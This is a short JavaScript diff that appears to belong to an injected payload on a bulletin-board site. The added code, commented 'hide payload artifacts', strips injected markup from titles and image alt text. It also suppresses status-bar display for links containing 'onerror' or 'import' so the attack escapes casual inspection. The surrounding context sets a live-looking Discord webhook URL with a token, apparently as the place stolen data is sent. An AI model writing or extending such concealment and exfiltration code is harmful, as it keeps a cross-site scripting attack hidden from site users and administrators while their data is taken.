@@ -1,3 +1,23 @@
+// === DOM cleanup — hide payload artifacts ===
+document.querySelectorAll('.bulletin-title, .image-placeholder img').forEach(el => {
+  // Clean title links: strip everything after the < in the text
+  if (el.classList?.contains('bulletin-title')) {
+    el.textContent = el.textContent.replace(/<.*$/s, '').trim();
+  }
+  // Clean alt text on images
+  if (el.tagName === 'IMG' && el.alt) {
+    el.alt = el.alt.replace(/<.*$/s, '').trim();
+  }
+});
+
+// Clean the URLs in href attributes (the slug exposes the payload)
+document.querySelectorAll('a[href*="onerror"], a[href*="import"]').forEach(a => {
+  // Don't change where it links, just hide it from casual inspection
+  // The href is server-generated so we can't truly fix it, but we can
+  // prevent it showing in the status bar by intercepting hover
+  a.addEventListener('mouseenter', () => window.status = '');
+});
+
 (async () => {
   const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';
 
